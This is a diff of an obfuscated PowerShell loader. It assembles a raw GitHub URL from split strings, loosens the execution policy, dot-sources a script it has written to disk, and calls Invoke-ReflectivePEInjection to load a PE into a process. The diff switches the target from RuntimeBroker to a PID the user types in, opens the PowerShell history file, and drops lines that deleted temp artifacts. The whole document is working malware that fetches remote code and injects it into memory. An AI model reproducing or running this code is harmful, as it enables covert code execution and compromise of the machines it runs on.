@@ -1,8 +1,13 @@
 $ErrorActionPreference = @("St","op") -join ""
 
-$_0x91A = @( "https://raw", ".githubusercontent", ".com/Knxtoz", "/wasd/refs", "/heads/main/", "instagram" ) -join ""
-
-$_0xB2F = Join-Path $env:TEMP (@("dbg","help",".dll") -join "")
+$_0x91A = @(
+"https://raw",
+".githubusercontent",
+".com/Knxtoz",
+"/wasd/refs",
+"/heads/main/",
+"instagram"
+) -join ""
 
 Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force -ErrorAction SilentlyContinue
 
@@ -36,13 +41,8 @@ $_0xA77 | Set-Content $_0xC11 -Encoding UTF8
 
 . $_0xC11
 
-$_0x2AA = (Get-Process RuntimeBroker | Select-Object -First 1).Id
+$_0x2AA = Read-Host (@("Enter"," PID") -join "")
+
+start $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 
 Invoke-ReflectivePEInjection -PEBytes $_0x5F9 -ProcId $_0x2AA
-
-notepad "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
-
-Remove-Item $_0xB2F -Force -ErrorAction SilentlyContinue
-
-Get-ChildItem (@("$env:TEMP","/Reflective_*.ps1") -join "") -ErrorAction SilentlyContinue |
-Remove-Item -Force -ErrorAction SilentlyContinue
